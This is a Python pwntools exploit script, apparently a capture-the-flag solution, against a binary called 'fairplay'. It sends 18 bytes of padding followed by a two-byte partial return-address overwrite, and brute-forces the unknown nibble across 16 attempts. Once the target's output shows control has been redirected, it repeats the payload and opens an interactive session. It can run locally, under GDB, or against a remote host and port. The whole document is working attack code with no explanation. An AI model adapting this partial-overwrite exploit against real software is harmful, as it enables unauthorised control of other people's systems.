from pwn import *
import warnings

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+115
continue
'''.format(**locals())

exe = './fairplay'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
warnings.filterwarnings("ignore")

libc = ELF('./libc.so.6')

def recvz():
    io.recv(200)

def solve(r):
    io.send(b'B'*18+p16(r))
    for i in range(8):
        io.sendafter(b'worthy?', b'B'*18+p16(r))
    
    io.sendline("PWNED")
    io.interactive()

for i in range(0xf+1):
    try:
        io = start()
        addr = str(hex(i)) + '170'
        print(f"Address: {addr}")
        print(f"Overwrite: {addr}")
        overwrite = int(addr, 16)
        r = b'B'*18+p16(overwrite)
        io.sendafter(b'worthy?', r)
        recvz()
        rp = io.recvline()
        print(f"Line: {rp}") 
        
        if b'Are you' in rp:
            solve(overwrite)
            break
    except EOFError:
        pass
